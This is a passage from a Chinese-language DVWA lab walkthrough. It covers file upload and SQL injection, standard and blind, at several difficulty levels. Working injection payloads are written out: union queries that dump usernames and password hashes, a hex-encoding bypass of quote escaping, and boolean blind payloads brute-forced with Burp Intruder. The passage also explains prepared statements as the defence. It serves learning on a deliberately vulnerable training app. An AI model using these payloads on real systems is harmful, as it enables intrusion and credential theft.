class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"><br>&lt;?php<br><br>if( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;<br>    // Check Anti-CSRF token<br>    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );<br><br><br>    // File information<br>    $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ];<br>    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1);<br>    $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ];<br>    $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ];<br>    $uploaded_tmp  = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ];<br><br>    // Where are we going to be writing to?<br>    $target_path   = DVWA_WEB_PAGE_TO_ROOT . &#x27;hackable/uploads/&#x27;;<br>    //$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;<br>    $target_file   =  md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;<br>    $temp_file     = ( ( ini_get( &#x27;upload_tmp_dir&#x27; ) == &#x27;&#x27; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#x27;upload_tmp_dir&#x27; ) ) );<br>    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;<br><br>    // Is it an image?<br>    if( ( strtolower( $uploaded_ext ) == &#x27;jpg&#x27; || strtolower( $uploaded_ext ) == &#x27;jpeg&#x27; || strtolower( $uploaded_ext ) == &#x27;png&#x27; ) &amp;&amp;<br>        ( $uploaded_size &lt; 100000 ) &amp;&amp;<br>        ( $uploaded_type == &#x27;image/jpeg&#x27; || $uploaded_type == &#x27;image/png&#x27; ) &amp;&amp;<br>        getimagesize( $uploaded_tmp ) ) &#123;<br><br>        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)<br>        if( $uploaded_type == &#x27;image/jpeg&#x27; ) &#123;<br>            $img = imagecreatefromjpeg( $uploaded_tmp );<br>            imagejpeg( $img, $temp_file, 100);<br>        &#125;<br>        else &#123;<br>            $img = imagecreatefrompng( $uploaded_tmp );<br>            imagepng( $img, $temp_file, 9);<br>        &#125;<br>        imagedestroy( $img );<br><br>        // Can we move the file to the web root from the temp folder?<br>        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;<br>            // Yes!<br>            echo &quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;<br>        &#125;<br>        else &#123;<br>            // No<br>            echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;<br>        &#125;<br><br>        // Delete any temp files<br>        if( file_exists( $temp_file ) )<br>            unlink( $temp_file );<br>    &#125;<br>    else &#123;<br>        // Invalid file<br>        echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;;<br>    &#125;<br>&#125;<br><br>// Generate Anti-CSRF token<br>generateSessionToken();<br><br>?&gt;<br><br></code></pre></td></tr></table></figure><p>token用于防御csrf。</p><p>防范非常严密，上传后的文件会被验证、重建还会被改名，然后再提交。</p><blockquote><p>函数uniqid （）：基于以微秒计的当前时间，生成一个唯一的ID</p><p>函数ini_get （）：报道查看函数相应选项对话</p><p>函数sys_get_temp_dir （）：用于报道查看临时文件的目录</p><p>函数imagecreatefromjpeg （文件名）：函数返回图片文件的图像标识，失败返回错误的</p><p>函数imagejpeg （图像，文件名，质量）：从图像图像以文件名为文件名创建一个JPEG图像，可选参数质量，范围从0（最差质量，文件更小）到100（最佳质量，文件最大）。</p><p>函数imagedestroy （）：函数销毁图像资源</p><p>函数rename （）：重命名文件或目录</p><p>函数getcwd （）：获取当前工作目录</p></blockquote><h1 id="七、SQL-Injection（sql注入）"><a href="#七、SQL-Injection（sql注入）" class="headerlink" title="七、SQL Injection（sql注入）"></a>七、SQL Injection（sql注入）</h1><h2 id="1-low-5"><a href="#1-low-5" class="headerlink" title="1.low"></a>1.low</h2><p>界面：一个输入框</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210701145031198.png" alt="image-20210701145031198"></p><p>源码：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210701145723133.png" alt="image-20210701145723133" style="zoom:50%;" /><p>get输入的id的值，然后将id在数据库查询，查询后输出first name和last name。</p><p>过程中并没有对输入查询的id值进行任何的检测和过滤。</p><p>按照步骤进行sql注入。</p><p><strong>1.判断注入类型</strong></p><p><code>1 and 1=1#</code>和<code>1 and 1=2#</code>都有正常的回显，所以并不是数字型，</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702104752146.png" alt="image-20210702104752146"></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702104808518.png" alt="image-20210702104808518"></p><p><code>1&#39; and &#39;1&#39;=&#39;1</code>  有正常回显。 <code>1&#39; and &#39;1&#39;=&#39;2</code>无回显。</p><p>所以是<strong>字符型</strong>。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702105150396.png" alt="image-20210702105150396"></p><p>【<code>1&#39; and &#39;1&#39;=&#39;2</code>无回显⬇️】</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702105459200.png" alt="image-20210702105459200"></p><p><strong>2.判断列数</strong></p><p>运用<strong>order by</strong>判断列数。</p><p>（order by语句用于根据指定的列对结果集进行排序）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702105951083.png" alt="image-20210702105951083"></p><p>order by到3就报错了，所以列数为3。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702110313691.png" alt="image-20210702110313691"></p><p><strong>3.判断回显位置</strong></p><p>使用<strong>union</strong>联合查询，<strong>select</strong>语句进行判断回显位置。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702110750153.png" alt="image-20210702110750153"></p><p>1回显在first name，2回显在surname上。</p><p>**4.**数据库名</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702111319538.png" alt="image-20210702111319538"></p><p>数据库名为dvwa。</p><p><strong>5.表名</strong></p><p>group_concat（），将多个字符串连在一起。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702111909275.png" alt="image-20210702111909275"></p><p>表有两个：guestbook，users</p><p><strong>6.列名</strong></p><p>查询方式和查表名方式相同。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702113607946.png" alt="image-20210702113607946"></p><p>列名：user_id,first_name,last_name,user,password,avatar,last_login,failed_login</p><p><strong>7.数据</strong></p><p>查看用户和密码。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702114209072.png" alt="image-20210702114209072"></p><p>密码用md5加密过，所以去md5解密网站（例如<a href="https://www.cmd5.com/">cmd5</a>）进行解密即可得到admin的密码。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702114325809.png" alt="image-20210702114325809"></p><h2 id="2-medium-5"><a href="#2-medium-5" class="headerlink" title="2.medium"></a>2.medium</h2><p>界面：无输入框，只能选择。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20210702142548059.png" alt="image-20210702142548059"></p><p>url：提交后url无显示（post提交）</p><p>源码：错误后回显示错误信息。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702143231925.png" alt="image-20210702143231925"></p><p>可以看出确实是post提交。</p><p>用bp抓一下包，知道了提交的数据格式。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702144128734.png" alt="image-20210702144128734"></p><p>可以选择用hackbar，也可以用bp进行接下来的操作。</p><p><strong>1.注入类型判断</strong></p><p>1 and 1&#x3D;1回显正常，1 and 1&#x3D;2回显错误。</p><p>数字型注入。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145305587.png" alt="image-20210702145305587"></p><p><strong>2.判断列数</strong></p><p>order by 到3报错，所以列数为2.</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145441034.png" alt="image-20210702145441034"></p><p><strong>3.判断回显位置</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145558230.png" alt="image-20210702145558230"></p><p><strong>4.数据库名</strong></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">id=<span class="hljs-number">1</span> <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145833451.png" alt="image-20210702145833451"></p><p><strong>5.列表名</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702151014456.png" alt="image-20210702151014456"></p><p>gustbook和users两个表。</p><p><strong>6.查询字段</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><br></code></pre></td></tr></table></figure><p>显示报错，报错信息如下。</p><blockquote><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">You have <span class="hljs-keyword">an</span> error <span class="hljs-keyword">in</span> your SQL syntax; check <span class="hljs-keyword">the</span> manual that corresponds <span class="hljs-built_in">to</span> your MySQL server <span class="hljs-built_in">version</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> syntax <span class="hljs-built_in">to</span> use near <span class="hljs-string">&#x27;\&#x27;users\&#x27;&#x27;</span> <span class="hljs-keyword">at</span> <span class="hljs-built_in">line</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></blockquote><p>单引号被转义了，<code>&#39;</code>变成了<code>\&#39;</code>。</p><p>把字符串user转换为十六进制进行绕过。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-number">0x7573657273</span>#<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702155816655.png" alt="image-20210702155816655"></p><p><strong>7.查询数据</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702160231683.png" alt="image-20210702160231683"></p><h2 id="3-high-5"><a href="#3-high-5" class="headerlink" title="3.high"></a>3.high</h2><p>界面：点击连接后弹窗。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702162231237.png" alt="image-20210702162231237"></p><p>源码：错误后显示something went wrong。实际上和medium的源码并没有太大的差别。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702162343418.png" alt="image-20210702162343418"></p><p><strong>1.判断注入类型</strong></p><p>字符型注入。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702163500790.png" alt="image-20210702163500790"></p><p><strong>2.判断列数</strong></p><p>3报错，所以列数为2.</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702163641113.png" alt="image-20210702163641113"></p><p>后面的操作和前面级别的操作并没有什么不同。</p><p>很疑惑弄在两个页面有什么意义，查询了之后才得到了解答。</p><blockquote><p>High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入。</p><p>因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p></blockquote><h2 id="4-impossible-5"><a href="#4-impossible-5" class="headerlink" title="4.impossible"></a><strong>4.impossible</strong></h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702170109179.png" alt="image-20210702170109179"></p><p> checktoken对token进行检查，防止crsf攻击。</p><p>还使用了sql预编译，预编译语句的优势在于归纳为：<strong>一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止sql注入。</strong></p><p>通俗来说，预编译就是提前做好了模板，用户进行的输入都是作为数据输入，不会进行任何逻辑操作。</p><p>而且还限制了只允许返回一条数据。</p><h1 id="八、SQL-Injection-Blind-（sql盲注）"><a href="#八、SQL-Injection-Blind-（sql盲注）" class="headerlink" title="八、SQL Injection (Blind) （sql盲注）"></a>八、SQL Injection (Blind) （sql盲注）</h1><h2 id="1-low-6"><a href="#1-low-6" class="headerlink" title="1.low"></a>1.low</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702172545641.png" alt="image-20210702172545641"></p><p>没有过滤。</p><p>输入一个id号，只会有存在与否的提示，并没有数据的回显。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706112621857.png" alt="image-20210706112621857"></p><h3 id="（1）判断注入类型"><a href="#（1）判断注入类型" class="headerlink" title="（1）判断注入类型"></a><strong>（1）判断注入类型</strong></h3><p><code>1&#39; and &#39;1&#39;=&#39;1</code>显示id存在于数据库。</p><p><code>1&#39; and &#39;1&#39;=&#39;2</code>显示id不存在于数据库。</p><p>所以是字符型注入。</p><p>判断列数：</p><p><code>1&#39; order by 3#</code>时报错。</p><p>说明列数为2.</p><p>实际上这一项对用处不大，因为判断出了列数也无法查看回显位置。</p><h3 id="（2）猜解数据库名长度"><a href="#（2）猜解数据库名长度" class="headerlink" title="（2）猜解数据库名长度"></a><strong>（2）猜解数据库名长度</strong></h3><p>使用length函数，猜解database的名字长度。当结果猜解正确，回显也会显示为真。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-built_in">length</span>(database())=<span class="hljs-number">1</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>输入4时显示显示为真，所以名字长度为4.</p><h3 id="（3）猜解数据库名"><a href="#（3）猜解数据库名" class="headerlink" title="（3）猜解数据库名"></a><strong>（3）猜解数据库名</strong></h3><p>一个一个对猜解数据库名，可以用到的函数有很多。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-meta">#left(从左侧截取database（）的前n位)</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left(database(),1)&gt;&#x27;</span>a<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">#ascii(两个1分别代表起始位和长度)，判断ascii码是否大于97</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span><br><br><span class="hljs-meta">#regexp正则表达</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select database()) regexp &#x27;</span>^a<span class="hljs-string">&#x27;#</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()) regexp <span class="hljs-string">&#x27;^dv&#x27;</span>#<br><br><span class="hljs-meta">#like，和regexp用法相似</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select database()) like &#x27;</span>dv%<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>一个个试太慢了，尝试用bp抓包爆破。</p><p>*<strong>bp爆破</strong></p><p>以left为例子，构造语句：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and ascii(substr((select database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>#<br></code></pre></td></tr></table></figure><p>抓包，send to intruder。</p><p>设置类型为<strong>cluster bomb</strong>，设置爆破点（起始位和ascii数字）。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142332397.png" alt="image-20210706142332397"></p><p>payload1设置为number，由于之前猜解了长度为4，所以设置长度为4。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142419716.png" alt="image-20210706142419716"></p><p>payload2也设置为number类型，范围为97-122（a-z的ascii范围）。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142551875.png" alt="image-20210706142551875"></p><p>attack，状态码为200的就是每一位的正确字母。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142251420.png" alt="image-20210706142251420"></p><p>将数字转码，得到数据库名——dvwa。</p><h3 id="（4）猜解表名"><a href="#（4）猜解表名" class="headerlink" title="（4）猜解表名"></a><strong>（4）猜解表名</strong></h3><p>和猜解数据库的方式相似。</p><ul><li><strong>先猜解有该数据库有几个表。</strong></li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">count</span>(<span class="hljs-params">table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">&#x27;dvwa&#x27;</span>)=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>到2的时候显示为真，说明有两个表。</p><ul><li><strong>猜解表的长度</strong></li></ul><p>第一个表：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">length</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>),1))</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>第二个表：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">length</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>),2))</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>测试后第一个表的长度为9，第二个表的长度为5.</p><ul><li><strong>猜解表的名字</strong></li></ul><p>第一个表：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ascii</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>),1))</span>=<span class="hljs-number">97</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706150211720.png" alt="image-20210706150211720"></p><p><strong>guestbook</strong>。</p><p>第二个表：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ascii</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">2</span></span>),1))</span>=<span class="hljs-number">97</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706151158000.png" alt="image-20210706151158000"></p><p><strong>users</strong>。</p><h3 id="（5）猜解字段名"><a href="#（5）猜解字段名" class="headerlink" title="（5）猜解字段名"></a><strong>（5）猜解字段名</strong></h3><p>和表名差别不大。</p><p>查询users表字段个数。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">count</span>(<span class="hljs-params">column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>)=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>查询的结果为8.</p><p>剩下的一个个查太麻烦了，还是使用爆破吧，如果数据量不是特别大，直接爆破名字也是可行的。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ascii</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>),1))</span>=<span class="hljs-number">97</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706153554762.png" alt="image-20210706153554762"></p><p>结果为：<strong>user_id</strong>。</p><p>第二个：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ascii</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span></span>),1))</span>=<span class="hljs-number">97</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>查询完所有的字段名为：</p><p>user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p><h3 id="（6）猜解用户名"><a href="#（6）猜解用户名" class="headerlink" title="（6）猜解用户名"></a><strong>（6）猜解用户名</strong></h3><p>第一个用户：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and ascii(substr((select user from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>#<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706154843388.png" 